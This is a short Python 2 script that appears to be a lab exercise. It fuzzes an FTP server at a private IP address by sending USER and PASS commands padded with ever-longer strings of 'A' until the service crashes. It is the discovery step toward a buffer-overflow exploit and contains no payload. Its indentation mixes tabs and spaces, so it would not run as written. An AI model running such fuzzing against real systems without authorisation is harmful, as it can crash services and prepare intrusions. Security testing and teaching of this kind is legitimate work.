#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try: 
               
		print "Trying to send %s bytes" % str(len(buffer))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.130.192',21)) 
                s.recv(1024)
		s.send(('USER ' + buffer+'\r\n'))
        	s.recv(1024)
       		s.send(('PASS ' + buffer+'\r\n'))
                s.recv(1024)		
		s.close()
		sleep(1)
		buffer = buffer + "A"*100

	except:

		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()


